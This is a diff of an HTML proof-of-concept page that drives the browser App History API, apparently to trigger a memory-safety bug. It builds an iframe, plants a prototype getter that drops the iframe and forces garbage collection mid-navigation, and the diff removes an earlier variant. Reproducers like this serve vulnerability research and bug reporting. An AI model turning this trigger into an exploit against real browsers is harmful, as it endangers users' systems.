@@ -1,18 +1,23 @@
 <html>
 	<script>
-	appHistory.onnavigate = (e) => {
-		Object.prototype.__defineGetter__("then", _=> {
-            alert(1);
-		});
-        alert(2);
-		console.log(e);
-		e.respondWith({});
-        alert(3);
-	};
+		function poc()
+		{
+			var i = document.createElement('iframe');			
+			i.src = 'data:text/html,';
+			document.body.appendChild(i);
 
-	function poc() {
-		location.href = '#1';
-	}
+			i.contentWindow.location = "/";
+			var o = {};
+			o.__proto__.__defineGetter__("state", _=>{
+				var ii = document.querySelector("iframe");
+				//ii.remove();
+				ii = null;
+				gc();
+				return "buffer";
+			});
+
+			i.contentWindow.appHistory.navigate("#hello", o);
+		}
 	</script>
 
 </html>
